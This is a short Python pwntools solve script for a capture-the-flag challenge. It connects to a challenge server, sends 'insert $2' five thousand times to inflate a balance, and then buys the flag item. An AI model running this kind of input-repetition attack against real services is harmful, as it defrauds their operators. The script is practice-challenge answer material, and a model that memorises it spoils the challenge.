#!/usr/bin/env python3
from pwn import *

# Note this does work but it is a bit slow
# The equivalent solve.sh removes the pwntools overhead

r = remote('chals.disorientation.cssa.club', 4670)

# Get the balance
for _ in range(5000):
    r.sendline(b'insert $2')
    r.recvline()  

# Buy the drink flag
r.sendline(b'buy C 3')
r.interactive()
